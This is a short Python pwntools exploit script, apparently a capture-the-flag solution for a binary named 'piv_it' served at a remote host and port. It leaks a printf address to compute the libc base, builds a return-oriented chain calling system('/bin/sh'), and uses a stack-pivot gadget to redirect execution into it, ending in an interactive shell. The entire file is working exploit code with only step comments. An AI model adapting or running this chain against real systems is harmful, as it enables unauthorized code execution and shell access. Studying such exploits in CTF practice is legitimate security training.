from pwn import *


def padding(size, block=8):
    return cyclic(size, alphabet=string.ascii_uppercase, n=block).encode()


def pop_shell_rop(rop, libc_base):
    pop_rdi_ret_offset = rop.find_gadget(['pop rdi', 'ret'])[0]
    system_offset = libc.symbols['system']
    bin_sh_offset = next(libc.search(b'/bin/sh'))
    ret_gadget_offset = rop.find_gadget(['ret'])[0]

    system_addr = libc_base + system_offset
    bin_sh_addr = libc_base + bin_sh_offset
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    ret_gadget = libc_base + ret_gadget_offset
    print('system_addr:', hex(system_addr))
    print('bin_sh_addr:', hex(bin_sh_addr))
    rop_chain = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret_gadget) + p64(system_addr)
    return rop_chain


context.arch = 'amd64'

# 设置远程或本地进程
if args.R:
    p = remote('lmao.lol', 9004)
elif args.H:
    p = process('./piv_it')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '85']
    p = gdb.debug('./piv_it',
                  gdbscript='''
                      b *main
                      b *vuln+68
                      c
                  ''')

# step1: leak printf addr
p.recvuntil(b"Unexpected Error Encountered At: ")
printf_leak = int(p.recvline().strip(), 16)
log.info(f"Printf leak: {hex(printf_leak)}")

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.39-0ubuntu8.2_amd64.so')

printf_offset = libc.symbols['printf']
libc_base = printf_leak - printf_offset

# step2: ROP chain
rop = ROP(libc)
rop_chain = pop_shell_rop(rop, libc_base)

p.sendlineafter(b'$ ', padding(72) + rop_chain)

# step3: stack pivot gadget
# 0x000000000008a510: add rsp, 0x2c8; pop rbx; pop r12; pop r13; pop rbp; ret;
add_rsp_gadget_addr = libc_base + 0x000000000008a510
p.sendlineafter(b'$ ', padding(40) + p64(add_rsp_gadget_addr))

p.interactive()
p.close()
